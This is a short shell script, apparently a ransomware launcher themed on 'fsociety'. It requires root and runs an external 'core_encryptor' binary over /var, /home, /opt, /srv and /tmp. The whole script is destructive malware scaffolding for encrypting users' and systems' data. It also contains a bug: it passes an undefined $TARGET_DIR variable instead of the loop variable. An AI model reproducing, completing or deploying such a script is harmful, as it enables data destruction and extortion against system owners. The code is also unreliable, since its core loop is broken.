#! /usr/bin/sh

if [ "$(id -u)" -ne 0 ]; then
  echo "[!] Permission denied: required root privilege."
  exit 1
fi

TARGET_DIRS="/var /home /opt /srv /tmp"
EXCLUDE_DIR="/fsociety"
ENCRYPTOR_BIN="./tools/core_encryptor"

if [ ! -f "$ENCRYPTOR_BIN" ]; then
  echo "[!] Error: Couldn't find ($ENCRYPTOR_BIN)!"
  exit 1
fi

echo "[*] Encrypting..."

for DIR in $TARGET_DIRS; do
  if [ -d "$DIR" ]; then
    echo "[*] Encrypting data in $DIR..."
    "$ENCRYPTOR_BIN" "$TARGET_DIR" "$EXCLUDE_DIR"
  fi
done

echo "[+] Encrypted."
